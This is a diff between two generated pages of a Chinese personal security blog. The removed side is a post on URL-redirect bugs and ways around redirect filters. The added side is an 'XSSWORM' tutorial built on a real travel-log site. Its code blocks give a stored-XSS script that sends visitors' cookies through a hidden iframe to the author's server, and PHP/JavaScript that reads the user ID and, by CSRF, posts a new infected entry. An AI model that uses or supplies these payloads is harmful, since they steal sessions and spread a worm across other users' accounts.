@@ -108,37 +108,27 @@
 
 
 
-  <meta name="description" content="URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式">
-<meta name="keywords" content="Web">
+  <meta name="description" content="一个不错的XSSWORM需要许多知识，总的来说还是很有趣的">
+<meta name="keywords" content="Web,XSS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Url Redirect">
-<meta property="og:url" content="http://yoursite.com/2019/03/31/URLRedirect/index.html">
+<meta property="og:title" content="XSSWORM">
+<meta property="og:url" content="http://yoursite.com/2019/03/31/xssworm/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式">
+<meta property="og:description" content="一个不错的XSSWORM需要许多知识，总的来说还是很有趣的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/1.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/3.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/5.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/6.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/8.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/9.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/10.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/11.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/12.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/7.jpg">
-<meta property="og:updated_time" content="2019-03-31T04:44:17.380Z">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/xssworm/1.png">
+<meta property="og:updated_time" content="2019-03-31T12:39:56.793Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Url Redirect">
-<meta name="twitter:description" content="URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式">
-<meta name="twitter:image" content="http://yoursite.com/2019/03/31/URLRedirect/1.jpg">
+<meta name="twitter:title" content="XSSWORM">
+<meta name="twitter:description" content="一个不错的XSSWORM需要许多知识，总的来说还是很有趣的">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/31/xssworm/1.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/03/31/URLRedirect/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/03/31/xssworm/"/>
 
 
 
@@ -148,7 +138,7 @@
   };
 </script>
 
-  <title>Url Redirect | Noel's Blog</title>
+  <title>XSSWORM | Noel's Blog</title>
   
 
 
@@ -309,7 +299,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/31/URLRedirect/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/31/xssworm/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Noel">
@@ -326,7 +316,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Url Redirect
+          <h1 class="post-title" itemprop="name headline">XSSWORM
               
             
           </h1>
@@ -351,7 +341,7 @@
                 
               
 
-              <time title="创建时间：2019-03-31 00:00:00 / 修改时间：12:44:17" itemprop="dateCreated datePublished" datetime="2019-03-31T00:00:00+08:00">2019-03-31</time>
+              <time title="创建时间：2019-03-31 00:00:00 / 修改时间：20:39:56" itemprop="dateCreated datePublished" datetime="2019-03-31T00:00:00+08:00">2019-03-31</time>
             
 
             
@@ -415,59 +405,52 @@
       
 
       
-        <font color="green">URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式</font><br><a id="more"></a><br><br><br><br><br>### <font color="dark">成因</font>
+        <font color="green">一个不错的XSSWORM需要许多知识，总的来说还是很有趣的</font>
 
-<p>常见方式</p>
-<ul>
-<li>META标签的refresh</li>
-<li>Javascript</li>
-<li>header</li>
-</ul>
-<p>meta</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=url"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>Javascript</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"url"</span>;</span><br></pre></td></tr></table></figure>
-<p>header</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Location:url"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当上述栗子中的url未限制时就产生了URL重定向/跳转漏洞</p>
-<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a><font color="dark">发现</font></h3><ul>
-<li><p>在退出处常见URL跳转</p>
-<p><img src="/2019/03/31/URLRedirect/1.jpg" alt=""></p>
+<a id="more"></a>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><font color="dark">利用条件</font></h3><ul>
+<li><p>可以利用的XSS</p>
+<p>例如个人档案，留言处，发表的文章，发表的动态之类的</p>
 </li>
-<li><p>利用burp的search，搜索=http 同时返回包为302的内容</p>
-<p><img src="/2019/03/31/URLRedirect/3.png" alt=""></p>
-<p>发包到repeater,略作修改</p>
-<p><img src="/2019/03/31/URLRedirect/4.png" alt=""></p>
+<li><p>可控点</p>
+<p>XSS存在处的CSRF</p>
 </li>
 </ul>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><font color="dark">绕过</font></h3><p>一般来说URL跳转发现比较容易，但是利用起来比较难，因为许多会做一些防护</p>
-<p>1.xip.io绕过</p>
-<p><img src="/2019/03/31/URLRedirect/5.jpg" alt=""></p>
-<p>这里只要不是www就会强制返回到<a href="https://xue.xx.com/login" target="_blank" rel="noopener">https://xue.xx.com/login</a></p>
-<p>但是利用<a href="https://xue.xx.com.*.xip.io" target="_blank" rel="noopener">https://xue.xx.com.*.xip.io</a></p>
-<p><img src="/2019/03/31/URLRedirect/6.jpg" alt=""></p>
-<p>2.使用@绕过</p>
-<p>这里并不能采用xip.io的方式绕过</p>
-<p><img src="/2019/03/31/URLRedirect/8.jpg" alt=""></p>
-<p>可以使用@但是如果@后的域名不在规定范围内同样不可跳转</p>
-<p><img src="/2019/03/31/URLRedirect/9.jpg" alt=""></p>
-<p>这个时候可以在@前加上/，\或者?尝试下</p>
-<p><img src="/2019/03/31/URLRedirect/10.jpg" alt=""></p>
-<p>3.http://后加反斜杠绕过</p>
-<p>有些时候@和.xip.io都不能使</p>
-<p><img src="/2019/03/31/URLRedirect/11.jpg" alt=""></p>
-<p>这个时候可以采用http://\的样式尝试绕过</p>
-<p><img src="/2019/03/31/URLRedirect/12.jpg" alt=""></p>
-<p>4.某些加密</p>
-<p><a href="http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT" target="_blank" rel="noopener">http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT</a></p>
-<p>这个链接会跳转到<a href="http://www.xilu.com/zhuanti_176871.html" target="_blank" rel="noopener">http://www.xilu.com/zhuanti_176871.html</a></p>
-<p>将 <strong>l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT</strong> base64解密</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x97\x8b\x8b\x8f\xc5\xd0\xd0\x88\x88\x88\xd1\x87\x96\x93\x8a\xd1\x9c\x90\x92\xd0\x85\x97\x8a\x9e\x91\x8b\x96\xa0\xce\xc8\xc9\xc7\xc8\xce\xd1\x97\x8b\x92\x93</span><br></pre></td></tr></table></figure>
-<p>推测与跳转的链接一一对应，推测出对应关系表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;a&apos;:&apos;9e&apos;, &apos;b&apos;:&apos;9d&apos;, &apos;c&apos;:&apos;9c&apos;, &apos;d&apos;:&apos;9b&apos;, &apos;e&apos;:&apos;9a&apos;,&apos;f&apos;:&apos;99&apos;, &apos;g&apos;:&apos;98&apos;, &apos;h&apos;:&apos;97&apos;, &apos;i&apos;:&apos;96&apos;, &apos;j&apos;:&apos;95&apos;,</span><br><span class="line"> &apos;k&apos;:&apos;94&apos;, &apos;l&apos;:&apos;93&apos;, &apos;m&apos;:&apos;92&apos;, &apos;n&apos;:&apos;91&apos;, &apos;o&apos;:&apos;90&apos;,&apos;p&apos;:&apos;8f&apos;, &apos;q&apos;:&apos;8e&apos;, &apos;r&apos;:&apos;8d&apos;, &apos;s&apos;:&apos;8c&apos;, &apos;t&apos;:&apos;8b&apos;,</span><br><span class="line"> &apos;u&apos;:&apos;8a&apos;, &apos;v&apos;:&apos;89&apos;, &apos;w&apos;:&apos;88&apos;, &apos;x&apos;:&apos;87&apos;, &apos;y&apos;:&apos;86&apos;,&apos;z&apos;:&apos;85&apos;,&apos;.&apos;:&apos;d1&apos;,&apos;/&apos;:&apos;d0&apos;,&apos;:&apos;:&apos;c5&apos;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/03/31/URLRedirect/7.jpg" alt=""></p>
+<h3 id="所需知识"><a href="#所需知识" class="headerlink" title="所需知识"></a><font color="dark">所需知识</font></h3><ul>
+<li>XSS</li>
+<li>Ajax 隐蔽的发送请求</li>
+<li>同源策略 <a href="http://noel.xin/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#more" target="_blank" rel="noopener">http://noel.xin/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#more</a></li>
+</ul>
+<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a><font color="dark">实现步骤</font></h3><ol>
+<li>发现可利用的XSS，以留言处为例</li>
+<li>发表留言处存在CSRF</li>
+<li>发表带有XSS的留言，XSS的作用是发布留言同时可以做一些其他事，例如获取Cookie</li>
+<li>用户被感染，留言传播</li>
+</ol>
+<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a><font color="dark">实例分析</font></h3><p>以某游记系统为例具体分析一下</p>
+<p>发表游记的参数中有一个直接输出，得到一枚储存型XSS</p>
+<p><img src="/2019/03/31/xssworm/1.png" alt=""></p>
+<p>想要构成worm,我们需要让其他看了这篇游记的人也发表一篇带有恶意代码的游记</p>
+<p>回到发表游记处，这里存在一个CSRF</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"id"</span>:<span class="string">"******"</span>,<span class="string">"userId"</span>:<span class="string">"*****"</span>,<span class="string">"userName"</span>:<span class="string">"******"</span>,<span class="string">"AssociateEntityList"</span>:[&#123;<span class="string">"brandId"</span>:<span class="number">134</span>,<span class="string">"brandName"</span>:<span class="string">"ABT"</span>,</span><br><span class="line"><span class="string">"seriesId"</span>:<span class="number">2366</span>,<span class="string">"seriesName"</span>:<span class="string">"ABT A3"</span>&#125;]</span><br><span class="line"> ............</span><br></pre></td></tr></table></figure>
+<p>不过这里有一点儿问题</p>
+<p>这里有id,userID,以及userName</p>
+<p>后面经过测试发现发表游记的时候id和userName都可以为空，那么问题来了，userId怎么获得呢？</p>
+<p>别忘了我们已经有一个储存型XSS了</p>
+<p>发现Cookie里有一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=97***548</span><br></pre></td></tr></table></figure>
+<p><strong>通过XSS将Cookie发送到自己的服务器上，同时对Cookie进行处理，得到userId,并进行CSRF操作</strong></p>
+<p>可能有些同学这时候就有疑问了，为什么不直接用JavaScript处理呢？</p>
+<p>原因是发表游记时值是Json的形式，使用JS很容易出错，如果使用转义符的话最后输出的时候转义符也会在，最后迫不得已选择了上述操作</p>
+<p>我们可以构造储存型XSS啦！</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var o=document.body;</span></span><br><span class="line"><span class="undefined">    var a=document.createElement("iframe");a.src="http://noel.xin/cookie.php?Cookie="+document.cookie;</span></span><br><span class="line"><span class="undefined">    a.style.opacity=0;</span></span><br><span class="line"><span class="undefined">	o.appendChild(a);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用得到的userID发表游记</p>
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$Cookie = @$_GET[&apos;Cookie&apos;]?$_GET[&apos;Cookie&apos;]:&apos;&apos;;</span><br><span class="line">$start = strpos($Cookie,&quot;userid&quot;)+10;</span><br><span class="line">$id = substr($Cookie,$start,8);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var req = new XMLHttpRequest();</span><br><span class="line">    var data = &quot;jsonData=&#123;&apos;id&apos;:0,&apos;userId&apos;:&lt;?=$id?&gt;,&apos;userName&apos;:&apos;&apos;,&apos;XSS&apos;:&apos;上述代码&apos;&#125;&quot;;</span><br><span class="line">    req.open(&apos;post&apos;,&apos;https://target.com&apos;,true);</span><br><span class="line">    req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;);</span><br><span class="line">    req.withCredentials = true;</span><br><span class="line">    req.send(data);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>完成！</p>
+<p>之后只要别人看了我发的游记后都会发一篇带有恶意代码的XSS，当然，为了爱和正义，文章立刻给删了。</p>
 <blockquote>
-<p>我寻了半生的春天，你一笑便是了。</p>
+<p>也许不能喜欢你到天边的花火都枯萎，但真的梦想过与你，并肩去看一场烟火</p>
 </blockquote>
 
       
@@ -491,6 +474,8 @@
           
             <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
           
+            <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
+          
         </div>
       
 
@@ -502,8 +487,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/30/bees/" rel="next" title="BeesCMS 代码审计">
-                <i class="fa fa-chevron-left"></i> BeesCMS 代码审计
+              <a href="/2019/03/31/URLRedirect/" rel="next" title="Url Redirect">
+                <i class="fa fa-chevron-left"></i> Url Redirect
               </a>
             
           </div>
@@ -511,10 +496,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/31/xssworm/" rel="prev" title="XSSWORM">
-                XSSWORM <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -718,7 +699,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#发现"><span class="nav-number">1.</span> <span class="nav-text">发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">2.</span> <span class="nav-text">绕过</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#所需知识"><span class="nav-number">2.</span> <span class="nav-text">所需知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实现步骤"><span class="nav-number">3.</span> <span class="nav-text">实现步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实例分析"><span class="nav-number">4.</span> <span class="nav-text">实例分析</span></a></li></ol></div>
             
 
           </div>
